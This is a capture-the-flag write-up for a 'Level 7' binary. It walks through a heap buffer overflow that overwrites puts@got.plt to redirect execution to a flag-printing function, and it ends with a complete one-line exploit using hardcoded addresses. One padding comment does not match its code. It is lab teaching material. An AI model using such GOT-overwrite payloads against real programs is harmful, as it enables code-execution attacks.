# Level 7

## Initial Context

- One file: `level7`

## Solving the Challenge

The executable expects two arguments.

If run using `ltrace`, we can see that there is 4 constant allocations, followed by 2 `strcpy` and a read of the flag file.

```bash
$ ltrace ./level7 a b
...
malloc(8)                               = 0x0804a008
malloc(8)                               = 0x0804a018
malloc(8)                               = 0x0804a028
malloc(8)                               = 0x0804a038
strcpy(0x0804a018, "a")                 = 0x0804a018
strcpy(0x0804a038, "b")                 = 0x0804a038
fopen("/home/user/level8/.pass", "r")
fgets(...)
puts("~~")
...
```

The program is copying `argv[1]` to the second allocated memory and `argv[2]` to the forth allocated memory.

Since the pointers are really close we can do a buffer overflow.

There is also a function `m` where the flag is printed from.
We need to redirect the `puts` call to `m`.

Since `puts` its not a direct call, but instead use the PLT, we have to overwrite the GOT.

The second and third allocation are only `16 bytes` afar.

Here is the first payload to overwrite the forth address to `puts@got.plt`:

```python
# padding of 16
"A" * 16

# padding of 8 to skip the "2" (or `second[0]`)
+ "A" * 4

# puts@got.plt's address in LE
+ "\x28\x99\x04\x08"
```

And here is the second payload to set the "new value" for `puts@got.plt`:

```python
# m's address in LE
+ "\xf4\x84\x04\x08"
```

The program will print the flag for us, so no need to save the payload into a file, we can send it directly to the vulnerable program:

```bash
$ ./level7 $(python -c 'print "A" * (16 + 4) + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
<flag>
```
